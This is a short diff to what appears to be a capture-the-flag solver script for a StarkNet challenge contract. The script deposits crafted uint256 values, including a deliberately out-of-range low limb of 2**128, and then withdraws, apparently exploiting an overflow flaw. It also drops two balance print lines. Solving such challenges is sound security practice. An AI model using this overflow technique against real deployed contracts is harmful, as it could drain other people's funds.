@@ -21,7 +21,7 @@ async def solver(client: AccountClient, frozen_contract: Contract):
     )
     await result.wait_for_acceptance()
     result = await frozen_contract.functions["deposit"].invoke(
-        {"high": 0, "low": 2**128 - 1}, max_fee=int(1e16)
+        {"high": 0, "low": 2**128}, max_fee=int(1e16)
     )
     await result.wait_for_acceptance()
     result = await frozen_contract.functions["deposit"].invoke(
@@ -38,13 +38,11 @@ async def solver(client: AccountClient, frozen_contract: Contract):
     await result.wait_for_acceptance()
 
     balance = await frozen_contract.functions["readBalance"].call()
-    print("Balance", balance)
 
     result = await frozen_contract.functions["withdraw"].invoke(max_fee=int(1e16))
     await result.wait_for_acceptance()
 
     balance = await frozen_contract.functions["readBalance"].call()
-    print("Balance", balance)
 
 
 run_solver(solver)
